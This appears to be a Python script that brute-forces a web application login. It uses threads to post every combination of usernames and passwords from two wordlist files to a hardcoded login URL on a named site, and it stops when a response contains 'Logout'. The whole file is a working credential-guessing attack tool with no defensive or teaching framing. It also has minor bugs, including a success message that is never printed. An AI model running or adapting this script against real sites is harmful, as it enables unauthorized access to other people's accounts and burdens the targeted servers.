import requests
import threading
from time import sleep
import sys

# Global Variables
url = "https://web-link-server.net/user.php?action=login"

# Successful Authentication
def cracked(username, password):
    "\n password cracked (%s:%s) \n" % (username, password)
    x = raw_input("\n Press ENTER to exit \n")
    sys.exit()

def login(username, password):
    form_data = {
        'penname': username,
        'password': password,
        'submit': 'Go',
    }
    header_data = {}
    resp = requests.post(url, data=form_data, headers=header_data)
    check = resp.text.encode("utf-8").find("Logout")
    print('{}:{} - {}'.format(username, password, resp.status_code))

    if check != -1:
        cracked(username, password)
    return check

def main():
    global url
    global userList
    global pwList

    userList = open('users.txt', 'r').read().split('\n')
    pwList = open('pw.txt', 'r').read().split('\n')
    credentials = [(user, pw) for user in userList for pw in pwList]

    i = 0
    while i < len(credentials):
        threads = []
        for j in range(i, min(i + 10, len(credentials))):
            cred = credentials[j]
            t = threading.Thread(target=login, args=cred)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()
        i += 10

# Call Main
main()
